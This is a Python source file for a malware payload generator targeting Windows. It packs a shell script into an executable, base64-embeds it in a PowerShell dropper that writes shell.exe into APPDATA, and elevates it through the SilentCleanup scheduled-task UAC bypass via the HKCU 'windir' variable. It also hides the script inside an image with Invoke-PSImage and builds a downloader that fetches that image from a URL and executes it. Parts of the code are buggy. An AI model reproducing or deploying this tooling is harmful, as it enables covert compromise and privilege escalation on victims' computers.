import os
import subprocess
import base64

class GenPayload(object):
    
    def __genScript__(self,baseexe):  
        script =r'''
        function get-shellexe($Base64String)
        {
            try{
                $path =  $env:APPDATA + '\testshell'
                mkdir $path 
            }
            catch{
                $abbaba=0
            }
            $Image = $env:APPDATA + '\testshell\shell.exe'
            [byte[]]$Bytes = [convert]::FromBase64String($Base64String)
            [System.IO.File]::WriteAllBytes($Image,$Bytes)
        }

        function runProg-admin($command)
        {
            if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
                    Invoke-Expression -Command $command | Out-String
                } 
            else 
                {
                    $registryPath = "HKCU:\Environment"
                    $Name = "windir"
                    $Value = "powershell -ep bypass -w h $PSCommandPath;
                    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
                    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
            }
        }

        $path = $env:APPDATA + '\testshell\shell.exe'

        if([System.IO.File]::Exists($path)-eq $false)
        {
            get-shellexe -Base64String $shell
        }

        runProg-admin -command "powershell start-process $path"'''
        return '$Base64String = '+baseexe+'\n'+(''.join([i[4:]+'\n' for i in script.split('\n')]))

    def __genexepayload__(self,url,command):
        script = r"""
        {
            $path = "$env:APPDATA\sten.png"
            if(([System.IO.File]::Exists($path)) -eq $false)
            {
                Invoke-WebRequest -uri $url -OutFile $path
            }

            $command = '"""+command+"""'
            Invoke-Expression -command $command
        }

        $url = '"""+url+"""
        Get-ShellImage -url $url"""
        script = 'function Get-ShellImage($url)'+(''.join([i[4:]+'\n' for i in script.split('\n')]))
        open('ToWriteEXE.ps1','w').write(script).close()
        return "ToWriteEXE.ps1"

    def __genbase__(self,pathToExe):
        with open (pathToExe,'rb') as file:
            data = base64.b64encode(file.read())
            file.close()
        return data.decode()

    def cmd(self,command):
            return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read().strip().decode(errors='replace')

    def genpayload(self,pathToScript,pathToimage,InvokePSImage):
        pathToScript = input('Enter path to the shell script (shell.ps1)')
        pathToimage = input('To embed the script in the image enter path to image')
        InvokePSImage = input('Enter path to Invoke-PSImage script')
        InvokePSImage = open('InvokePSImage','r').read()
        self.cmd('Powershell ps2exe  "'+pathToScript+'"-outputFile PayloadAc.exe')
        base = self.__genbase__('PayloadAc.exe')
        os.remove('PayloadAc.exe')
        open('ScriptAcPayload.ps1','w').write(self.__genScript__(base))
        open('powpsimageAC.ps1','w').write(InvokePSImage+'\nInvoke-PSImage -Script "'+pathToScript+'" -Image "'+pathToimage+'" -Out mallimage.png').close()
        commandPayload = self.cmd('powershell .\\powpsimageAC.ps1')
        print('The payload image is located in '+os.getcwdb()+'\\'+'mallimage.png')
        ask = input('to complete the operation upload the image and enter the url\nto get only the executable command enter 1\to get exe with payload enter url to the image\n: ')
        if ask == '1':
            return commandPayload
        self.cmd('powershell ps2exe '+self.__genexepayload__(ask,commandPayload)+' -outputFile PayloadAc.exe')
        return 'Successfully completed'
    
